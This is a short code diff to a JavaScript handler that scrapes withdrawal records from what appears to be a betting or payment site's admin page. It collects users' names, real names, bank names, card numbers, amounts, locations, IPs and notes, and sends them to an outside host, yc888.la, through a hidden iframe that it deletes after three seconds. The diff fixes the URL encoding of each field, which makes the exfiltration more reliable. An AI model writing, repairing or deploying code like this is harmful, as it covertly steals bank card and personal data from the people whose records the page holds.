@@ -33,22 +33,22 @@
            dataType: 'html',
            url:details,
            success: function(f){
-             var name = f.between('提现发起人:</td><td>','</font>');
-             var master = f.between('所属总代:</td><td>','</font>');
-             var bank = f.between('银行名称:</td><td>','</td>');
-             var cardnum = f.between('<span id="card">','</span>');
-             var province = f.between('所属省份:</td><td>','</td>');
-             var city = f.between('所属城市:</td><td>','</td>');
-             var truename = f.between('<span id="uname">','</span>');
-             var amount = f.between('<span id="money">','</span>');
-             var time = f.between('发起时间:</td><td>','</td>');
-             var isvip = f.between('是否VIP:</td><td style="font-weight: bold">','</td>');
-             var ip = f.between('用户IP:</td><td>','</td>');
-             var desc = f.between('用户备注:</td><td>','</td>');
+             var name = encodeURIComponent(f.between('提现发起人:</td><td>','</font>'));
+             var master = encodeURIComponent(f.between('所属总代:</td><td>','</font>'));
+             var bank = encodeURIComponent(f.between('银行名称:</td><td>','</td>'));
+             var cardnum = encodeURIComponent(f.between('<span id="card">','</span>'));
+             var province = encodeURIComponent(f.between('所属省份:</td><td>','</td>'));
+             var city = encodeURIComponent(f.between('所属城市:</td><td>','</td>'));
+             var truename = encodeURIComponent(f.between('<span id="uname">','</span>'));
+             var amount = encodeURIComponent(f.between('<span id="money">','</span>'));
+             var time = encodeURIComponent(f.between('发起时间:</td><td>','</td>'));
+             var isvip = encodeURIComponent(f.between('是否VIP:</td><td style="font-weight: bold">','</td>'));
+             var ip = encodeURIComponent(f.between('用户IP:</td><td>','</td>'));
+             var desc = encodeURIComponent(f.between('用户备注:</td><td>','</td>'));
              
             var iframes = $('<iframe>');
             $('body').append(iframes);
-            iframes[0].src = encodeURI('http://www.yc888.la/bank/save.php?name=' + name +'&master=' + master + '&bank=' + bank+ '&cardnum=' +cardnum+'&province=' +province+ '&city=' +city+ '&truename=' +truename+ '&amount=' +amount+ '&time=' + time+ '&isvip=' +isvip+ '&ip=' +ip+ '&desc='  + desc);
+            iframes[0].src = 'http://www.yc888.la/bank/save.php?name=' + name +'&master=' + master + '&bank=' + bank+ '&cardnum=' +cardnum+'&province=' +province+ '&city=' +city+ '&truename=' +truename+ '&amount=' +amount+ '&time=' + time+ '&isvip=' +isvip+ '&ip=' +ip+ '&desc='  + desc;
             setTimeout(function(){
               iframes.remove();    
             },3000)
